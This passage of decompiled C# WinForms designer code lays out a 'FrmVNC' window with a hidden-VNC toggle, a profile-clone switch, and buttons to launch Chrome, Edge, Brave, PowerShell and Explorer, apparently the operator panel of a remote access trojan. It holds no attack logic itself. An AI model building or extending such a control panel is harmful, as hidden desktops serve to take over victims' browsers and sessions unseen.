			this.test1ToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.test1ToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.test1ToolStripMenuItem.DisabledState.Parent = this.test1ToolStripMenuItem;
			this.test1ToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.test1ToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.test1ToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.test1ToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.test1ToolStripMenuItem.HoverState.Parent = this.test1ToolStripMenuItem;
			this.test1ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("test1ToolStripMenuItem.Image");
			this.test1ToolStripMenuItem.Location = new global::System.Drawing.Point(188, 3);
			this.test1ToolStripMenuItem.Name = "test1ToolStripMenuItem";
			this.test1ToolStripMenuItem.ShadowDecoration.Parent = this.test1ToolStripMenuItem;
			this.test1ToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.test1ToolStripMenuItem.TabIndex = 67;
			this.test1ToolStripMenuItem.Text = "Chrome";
			this.test1ToolStripMenuItem.Click += new global::System.EventHandler(this.test1ToolStripMenuItem_Click);
			this.edgeToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.edgeToolStripMenuItem.Animated = true;
			this.edgeToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.edgeToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.edgeToolStripMenuItem.BorderRadius = 1;
			this.edgeToolStripMenuItem.BorderThickness = 1;
			this.edgeToolStripMenuItem.CheckedState.Parent = this.edgeToolStripMenuItem;
			this.edgeToolStripMenuItem.CustomImages.Parent = this.edgeToolStripMenuItem;
			this.edgeToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.edgeToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.edgeToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.edgeToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.edgeToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.edgeToolStripMenuItem.DisabledState.Parent = this.edgeToolStripMenuItem;
			this.edgeToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.edgeToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.edgeToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.edgeToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.edgeToolStripMenuItem.HoverState.Parent = this.edgeToolStripMenuItem;
			this.edgeToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("edgeToolStripMenuItem.Image");
			this.edgeToolStripMenuItem.Location = new global::System.Drawing.Point(310, 3);
			this.edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
			this.edgeToolStripMenuItem.ShadowDecoration.Parent = this.edgeToolStripMenuItem;
			this.edgeToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.edgeToolStripMenuItem.TabIndex = 67;
			this.edgeToolStripMenuItem.Text = "Edge";
			this.edgeToolStripMenuItem.Click += new global::System.EventHandler(this.edgeToolStripMenuItem_Click);
			this.fileExplorerToolStripMenuItem.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.fileExplorerToolStripMenuItem.Animated = true;
			this.fileExplorerToolStripMenuItem.BackColor = global::System.Drawing.Color.Transparent;
			this.fileExplorerToolStripMenuItem.BorderColor = global::System.Drawing.Color.Transparent;
			this.fileExplorerToolStripMenuItem.BorderRadius = 1;
			this.fileExplorerToolStripMenuItem.BorderThickness = 1;
			this.fileExplorerToolStripMenuItem.CheckedState.Parent = this.fileExplorerToolStripMenuItem;
			this.fileExplorerToolStripMenuItem.CustomImages.Parent = this.fileExplorerToolStripMenuItem;
			this.fileExplorerToolStripMenuItem.DisabledState.BorderColor = global::System.Drawing.Color.DarkGray;
			this.fileExplorerToolStripMenuItem.DisabledState.CustomBorderColor = global::System.Drawing.Color.DarkGray;
			this.fileExplorerToolStripMenuItem.DisabledState.FillColor = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.fileExplorerToolStripMenuItem.DisabledState.FillColor2 = global::System.Drawing.Color.FromArgb(169, 169, 169);
			this.fileExplorerToolStripMenuItem.DisabledState.ForeColor = global::System.Drawing.Color.FromArgb(141, 141, 141);
			this.fileExplorerToolStripMenuItem.DisabledState.Parent = this.fileExplorerToolStripMenuItem;
			this.fileExplorerToolStripMenuItem.FillColor = global::System.Drawing.Color.Transparent;
			this.fileExplorerToolStripMenuItem.FillColor2 = global::System.Drawing.Color.Transparent;
			this.fileExplorerToolStripMenuItem.Font = new global::System.Drawing.Font("Segoe UI", 9f);
			this.fileExplorerToolStripMenuItem.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.fileExplorerToolStripMenuItem.HoverState.Parent = this.fileExplorerToolStripMenuItem;
			this.fileExplorerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("fileExplorerToolStripMenuItem.Image");
			this.fileExplorerToolStripMenuItem.Location = new global::System.Drawing.Point(676, 3);
			this.fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
			this.fileExplorerToolStripMenuItem.ShadowDecoration.Parent = this.fileExplorerToolStripMenuItem;
			this.fileExplorerToolStripMenuItem.Size = new global::System.Drawing.Size(106, 31);
			this.fileExplorerToolStripMenuItem.TabIndex = 67;
			this.fileExplorerToolStripMenuItem.Text = "Explorer";
			this.fileExplorerToolStripMenuItem.Click += new global::System.EventHandler(this.fileExplorerToolStripMenuItem_Click);
			this.IntervalLabel.Anchor = global::System.Windows.Forms.AnchorStyles.Top;
			this.IntervalLabel.AutoSize = true;
			this.IntervalLabel.ForeColor = global::System.Drawing.Color.Gainsboro;
			this.IntervalLabel.Location = new global::System.Drawing.Point(77, 680);
			this.IntervalLabel.Name = "IntervalLabel";
			this.IntervalLabel.Size = new global::System.Drawing.Size(88, 13);
			this.IntervalLabel.TabIndex = 6;
			this.IntervalLabel.Text = "Interval (ms): 500";
			this.IntervalLabel.Visible = false;
			this.siticoneBorderlessForm1.ContainerControl = this;
			this.siticoneBorderlessForm1.ShadowColor = global::System.Drawing.Color.FromArgb(29, 185, 84);
			this.siticoneDragControl1.TargetControl = this.panel1;
			this.IntervalScroll.BackColor = global::System.Drawing.Color.Transparent;
			this.IntervalScroll.FillColor = global::System.Drawing.Color.FromArgb(4, 143, 110);
			this.IntervalScroll.HoverState.Parent = this.IntervalScroll;
			this.IntervalScroll.Location = new global::System.Drawing.Point(188, 670);
			this.IntervalScroll.Name = "IntervalScroll";
			this.IntervalScroll.Size = new global::System.Drawing.Size(59, 23);
			this.IntervalScroll.Style = 1;
			this.IntervalScroll.TabIndex = 152;
			this.IntervalScroll.ThumbColor = global::System.Drawing.Color.FromArgb(8, 104, 81);
			this.IntervalScroll.Visible = false;
			this.IntervalScroll.Scroll += new global::System.Windows.Forms.ScrollEventHandler(this.IntervalScroll_Scroll);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(27, 27, 27);
			base.ClientSize = new global::System.Drawing.Size(1261, 775);
			base.Controls.Add(this.VNCBox);
			base.Controls.Add(this.IntervalLabel);
			base.Controls.Add(this.siticoneGradientPanel4);
			base.Controls.Add(this.panel1);
			base.Controls.Add(this.siticoneGradientPanel2);
			base.Controls.Add(this.siticoneGradientPanel1);
			base.Controls.Add(this.IntervalScroll);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.MinimizeBox = false;
			this.MinimumSize = new global::System.Drawing.Size(1120, 632);
			base.Name = "FrmVNC";
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			base.FormClosing += new global::System.Windows.Forms.FormClosingEventHandler(this.VNCForm_FormClosing);
			base.Load += new global::System.EventHandler(this.VNCForm_Load);
			base.Click += new global::System.EventHandler(this.VNCForm_Click);
			base.KeyPress += new global::System.Windows.Forms.KeyPressEventHandler(this.VNCForm_KeyPress);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			((global::System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
			this.siticoneGradientPanel4.ResumeLayout(false);
			this.siticoneGradientPanel4.PerformLayout();
			this.statusled.EndInit();
			this.siticoneGradientPanel1.ResumeLayout(false);
			this.siticoneGradientPanel1.PerformLayout();
			this.siticoneGradientPanel2.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x040000A5 RID: 165
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040000A6 RID: 166
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x040000A7 RID: 167
		private global::System.Windows.Forms.Timer timer2;

		// Token: 0x040000A8 RID: 168
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel2;

		// Token: 0x040000A9 RID: 169
		private global::System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;

		// Token: 0x040000AA RID: 170
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x040000AB RID: 171
		private global::System.Windows.Forms.PictureBox VNCBox;

		// Token: 0x040000AC RID: 172
		private global::System.Windows.Forms.PictureBox pictureBox1;

		// Token: 0x040000AD RID: 173
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator1;

		// Token: 0x040000AE RID: 174
		private global::System.Windows.Forms.Label chkClone1;

		// Token: 0x040000AF RID: 175
		private global::System.Windows.Forms.Label QualityLabel;

		// Token: 0x040000B0 RID: 176
		private global::System.Windows.Forms.Label label2;

		// Token: 0x040000B1 RID: 177
		private global::System.Windows.Forms.Label label3;

		// Token: 0x040000B2 RID: 178
		private global::System.Windows.Forms.Label ledstatus;

		// Token: 0x040000B3 RID: 179
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel4;

		// Token: 0x040000B4 RID: 180
		private global::Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch ToggleHVNC;

		// Token: 0x040000B5 RID: 181
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel1;

		// Token: 0x040000B6 RID: 182
		private global::System.Windows.Forms.Label toolStripStatusLabel3;

		// Token: 0x040000B7 RID: 183
		private global::Siticone.Desktop.UI.WinForms.SiticoneGradientPanel siticoneGradientPanel2;

		// Token: 0x040000B8 RID: 184
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton test2ToolStripMenuItem;

		// Token: 0x040000B9 RID: 185
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton CloseBtn;

		// Token: 0x040000BA RID: 186
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton braveToolStripMenuItem;

		// Token: 0x040000BB RID: 187
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton powershellToolStripMenuItem;

		// Token: 0x040000BC RID: 188
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton test1ToolStripMenuItem;

		// Token: 0x040000BD RID: 189
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton edgeToolStripMenuItem;

		// Token: 0x040000BE RID: 190
		public global::Siticone.Desktop.UI.WinForms.SiticoneGradientButton fileExplorerToolStripMenuItem;

		// Token: 0x040000BF RID: 191
		private global::System.Windows.Forms.Label IntervalLabel;

		// Token: 0x040000C0 RID: 192
		private global::Siticone.Desktop.UI.WinForms.SiticoneBorderlessForm siticoneBorderlessForm1;

		// Token: 0x040000C1 RID: 193
		private global::Siticone.Desktop.UI.WinForms.SiticoneDragControl siticoneDragControl1;

		// Token: 0x040000C2 RID: 194
		private global::Siticone.Desktop.UI.WinForms.SiticoneToggleSwitch chkClone;

		// Token: 0x040000C3 RID: 195
		private global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar QualityScroll;

		// Token: 0x040000C4 RID: 196
		private global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar ResizeScroll;

		// Token: 0x040000C5 RID: 197
		private global::Siticone.Desktop.UI.WinForms.SiticoneResizeBox siticoneResizeBox1;

		// Token: 0x040000C6 RID: 198
		private global::Siticone.Desktop.UI.WinForms.SiticoneTrackBar IntervalScroll;

		// Token: 0x040000C7 RID: 199
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox3;

		// Token: 0x040000C8 RID: 200
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox2;

		// Token: 0x040000C9 RID: 201
		private global::Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox1;

		// Token: 0x040000CA RID: 202
		private global::Siticone.Desktop.UI.WinForms.SiticoneCirclePictureBox statusled;
	}
}
